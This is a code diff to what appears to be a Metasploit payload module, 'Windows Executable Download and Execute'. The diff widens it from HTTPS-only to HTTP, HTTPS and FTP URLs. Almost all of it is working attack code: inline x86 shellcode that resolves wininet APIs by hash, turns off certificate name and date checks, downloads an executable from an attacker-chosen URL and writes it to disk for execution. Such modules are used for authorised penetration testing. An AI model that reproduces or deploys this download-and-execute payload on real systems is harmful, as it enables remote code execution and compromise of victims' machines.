@@ -20,8 +20,8 @@ module Metasploit3
 
 	def initialize(info = {})
 		super(merge_info(info,
-			'Name'          => 'Windows Executable Download (https) and Execute',
-			'Description'   => 'Download an EXE from an HTTPS URL and execute it',
+			'Name'          => 'Windows Executable Download (http,https,ftp) and Execute',
+			'Description'   => 'Download an EXE from an HTTP(S)/FTP URL and execute it',
 			'Author'        =>
 				[
 					'corelanc0d3r <peter.ve[at]corelan.be>'
@@ -47,12 +47,27 @@ module Metasploit3
 
 		target_uri = datastore['URL'] || ""
 		filename = datastore['EXE'] || ""
+		proto = "https"
+		dwflags_asm = "push (0x80000000 | 0x04000000 | 0x00800000 | 0x00200000 |0x00001000 |0x00002000 |0x00000200) ; dwFlags\n"
+			#;0x80000000 |        ; INTERNET_FLAG_RELOAD
+			#;0x04000000 |        ; INTERNET_NO_CACHE_WRITE
+			#;0x00800000 |        ; INTERNET_FLAG_SECURE
+			#;0x00200000 |        ; INTERNET_FLAG_NO_AUTO_REDIRECT
+			#;0x00001000 |        ; INTERNET_FLAG_IGNORE_CERT_CN_INVALID
+			#;0x00002000 |        ; INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
+			#;0x00000200          ; INTERNET_FLAG_NO_UI"
 	
 		exitfuncs = {
-					"PROCESS"	=> 0x56A2B5F0,	#kernel32.dll!ExitProcess
-					"THREAD"	=> 0x0A2A1DE0,	#kernel32.dll!ExitThread
-					"SEH"		=> 0x00000000,	#we don't care
-					"NONE"		=> 0x00000000	#we don't care
+				"PROCESS"	=> 0x56A2B5F0,	#kernel32.dll!ExitProcess
+				"THREAD"	=> 0x0A2A1DE0,	#kernel32.dll!ExitThread
+				"SEH"		=> 0x00000000,	#we don't care
+				"NONE"		=> 0x00000000	#we don't care
+				}
+
+		protoflags = {
+				"http"	=> 0x3,
+				"https"	=> 0x3,
+				"ftp"	=> 0x1
 				}
 
 		exitfunc = datastore['EXITFUNC'].upcase
@@ -76,9 +91,20 @@ module Metasploit3
 
 		if target_uri.length > 0
 
-			# first, sanitize the input
+			# get desired protocol
+			if target_uri.start_with?'http://'
+				proto = "http"
+				dwflags_asm = "push (0x80000000 | 0x04000000 | 0x00200000 |0x00001000 |0x00002000 |0x00000200) ; dwFlags\n"
+			end
+			if target_uri.start_with?'ftp://'
+				proto = "ftp"
+				dwflags_asm = "push (0x80000000 | 0x04000000 | 0x00200000 |0x00001000 |0x00002000 |0x00000200) ; dwFlags\n"
+			end
+
+			# sanitize the input
 			target_uri = target_uri.gsub('http://','')	#don't care about protocol
 			target_uri = target_uri.gsub('https://','')	#don't care about protocol
+			target_uri = target_uri.gsub('ftp://','')	#don't care about protocol
 		
 			server_info = target_uri.split("/")
 
@@ -100,6 +126,10 @@ module Metasploit3
 			end
 
 		end
+
+		# get protocol specific stuff
+		
+		
 
 		#create actual payload
 		payload_data = <<EOS
@@ -218,7 +248,7 @@ internetconnect:
 	xor ecx, ecx
 	push ecx               ; DWORD_PTR dwContext (NULL)
 	push ecx               ; dwFlags
-	push 3                 ; DWORD dwService (INTERNET_SERVICE_HTTP)
+	push #{protoflags[proto]}	; DWORD dwService (INTERNET_SERVICE_HTTP or INTERNET_SERVICE_FTP)
 	push ecx               ; password
 	push ecx               ; username
 	push #{port_nr}        ; PORT
@@ -231,25 +261,18 @@ internetconnect:
 
 httpopenrequest:
 	pop ecx
-	xor edx, edx           ; NULL
-	push edx               ; dwContext (NULL)
-	push (0x80000000 | 0x04000000 | 0x00800000 | 0x00200000 |0x00001000 |0x00002000 |0x00000200) ; dwFlags
-	;0x80000000 |        ; INTERNET_FLAG_RELOAD
-	;0x04000000 |        ; INTERNET_NO_CACHE_WRITE
-	;0x00800000 |        ; INTERNET_FLAG_SECURE
-	;0x00200000 |        ; INTERNET_FLAG_NO_AUTO_REDIRECT
-	;0x00001000 |        ; INTERNET_FLAG_IGNORE_CERT_CN_INVALID
-	;0x00002000 |        ; INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
-	;0x00000200          ; INTERNET_FLAG_NO_UI
-	push edx               ; accept types
-	push edx               ; referrer
-	push edx               ; version
-	push ecx               ; url
-	push edx               ; method
-	push eax               ; hConnection
-	push 0x3B2E55EB        ; hash( "wininet.dll", "HttpOpenRequestA" )
+	xor edx, edx           	; NULL
+	push edx               	; dwContext (NULL)
+	#{dwflags_asm}		; dwFlags
+	push edx               	; accept types
+	push edx               	; referrer
+	push edx               	; version
+	push ecx               	; url
+	push edx               	; method
+	push eax               	; hConnection
+	push 0x3B2E55EB        	; hash( "wininet.dll", "HttpOpenRequestA" )
 	call ebp
-	mov esi, eax           ; hHttpRequest
+	mov esi, eax           	; hHttpRequest
 
 set_retry:
 	push 0x10
@@ -310,11 +333,9 @@ get_filename_return:
 
 download_prep:
 	xchg eax, ebx          	; place the file handle in ebx
-	;push ebx               ; store a copy of file handle on the stack
 	xor eax,eax		; zero eax
 	mov ax,0x104		; we'll download 0x100 bytes at a time
 	sub esp,eax		; reserve space on stack
-	;mov edi, esp           	; &bytesRead
 
 download_more:
 	push esp               	; &bytesRead
